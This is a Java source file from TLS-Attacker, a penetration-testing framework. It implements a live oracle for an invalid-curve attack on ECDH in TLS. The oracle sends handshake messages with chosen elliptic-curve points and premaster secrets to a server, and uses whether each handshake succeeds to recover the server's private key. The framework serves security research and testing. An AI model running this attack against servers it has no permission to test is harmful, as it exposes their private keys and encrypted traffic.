/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2016 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.ec.oracles;

import de.rub.nds.tlsattacker.modifiablevariable.ModifiableVariableFactory;
import de.rub.nds.tlsattacker.modifiablevariable.biginteger.BigIntegerModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.biginteger.ModifiableBigInteger;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.tls.crypto.ec.Curve;
import de.rub.nds.tlsattacker.tls.crypto.ec.DivisionException;
import de.rub.nds.tlsattacker.tls.crypto.ec.ECComputer;
import de.rub.nds.tlsattacker.tls.crypto.ec.Point;
import de.rub.nds.tlsattacker.tls.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.tls.protocol.handshake.ECDHClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.tls.workflow.TlsConfig;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.TlsContextAnalyzer;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import java.math.BigInteger;
import java.util.Arrays;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.LoggerConfig;
import org.bouncycastle.util.BigIntegers;

/**
 * 
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 */
public class RealDirectMessageECOracle extends ECOracle {

    private final TlsConfig config;

    private Point checkPoint;

    private byte[] checkPMS;

    private final ECComputer computer;

    public RealDirectMessageECOracle(TlsConfig config, Curve curve) {
        this.config = config;
        this.curve = curve;
        this.computer = new ECComputer();
        this.computer.setCurve(curve);

        executeValidWorkflowAndExtractCheckValues();

        LoggerContext ctx = (LoggerContext) LogManager.getContext(false);
        Configuration ctxConfig = ctx.getConfiguration();
        LoggerConfig loggerConfig = ctxConfig.getLoggerConfig(LogManager.ROOT_LOGGER_NAME);
        loggerConfig.setLevel(Level.INFO);
        ctx.updateLoggers();
    }

    @Override
    public boolean checkSecretCorrectnes(Point ecPoint, BigInteger secret) {
        ConfigHandler configHandler = new ConfigHandler();
        TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
        TlsContext tlsContext = configHandler.initializeTlsContext(config);
        WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

        WorkflowTrace trace = tlsContext.getWorkflowTrace();
        ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) trace
                .getFirstConfiguredSendMessageOfType(HandshakeMessageType.CLIENT_KEY_EXCHANGE);

        // modify public point base X coordinate
        ModifiableBigInteger x = ModifiableVariableFactory.createBigIntegerModifiableVariable();
        x.setModification(BigIntegerModificationFactory.explicitValue(ecPoint.getX()));
        message.setPublicKeyBaseX(x);

        // modify public point base Y coordinate
        ModifiableBigInteger y = ModifiableVariableFactory.createBigIntegerModifiableVariable();
        y.setModification(BigIntegerModificationFactory.explicitValue(ecPoint.getY()));
        message.setPublicKeyBaseY(y);

        // set explicit premaster secret value (X value of the resulting point
        // coordinate)
        ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
        byte[] explicitePMS = BigIntegers.asUnsignedByteArray(curve.getKeyBits() / 8, secret);
        pms.setModification(ByteArrayModificationFactory.explicitValue(explicitePMS));
        message.setPremasterSecret(pms);

        if (numberOfQueries % 100 == 0) {
            LOGGER.info("Number of queries so far: {}", numberOfQueries);
        }

        boolean valid = true;
        try {
            workflowExecutor.executeWorkflow();
        } catch (WorkflowExecutionException e) {
            valid = false;
            e.printStackTrace();
        } finally {
            numberOfQueries++;
            transportHandler.closeConnection();
        }

        if (!TlsContextAnalyzer.containsFullWorkflow(tlsContext)) {
            valid = false;
        }

        return valid;
    }

    @Override
    public boolean isFinalSolutionCorrect(BigInteger guessedSecret) {
        // BigInteger correct = new
        // BigInteger("25091756309879652045519159642875354611257005804552159157");
        // if (correct.compareTo(guessedSecret) == 0) {
        // return true;
        // } else {
        // return false;
        // }

        computer.setSecret(guessedSecret);
        try {
            Point p = computer.mul(checkPoint);
            byte[] pms = BigIntegers.asUnsignedByteArray(curve.getKeyBits() / 8, p.getX());
            return Arrays.equals(checkPMS, pms);
        } catch (DivisionException ex) {
            LOGGER.debug(ex);
            return false;
        }
    }

    /**
     * Executes a valid workflow with valid points etc. and saves the values for
     * further validation purposes.
     */
    private void executeValidWorkflowAndExtractCheckValues() {
        ConfigHandler configHandler = new ConfigHandler();
        TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
        TlsContext tlsContext = configHandler.initializeTlsContext(config);
        WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

        WorkflowTrace trace = tlsContext.getWorkflowTrace();

        workflowExecutor.executeWorkflow();
        transportHandler.closeConnection();

        ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) trace
                .getFirstConfiguredSendMessageOfType(HandshakeMessageType.CLIENT_KEY_EXCHANGE);

        // get public point base X and Y coordinates
        BigInteger x = message.getPublicKeyBaseX().getValue();
        BigInteger y = message.getPublicKeyBaseY().getValue();
        checkPoint = new Point(x, y);
        checkPMS = message.getPremasterSecret().getValue();
    }
}
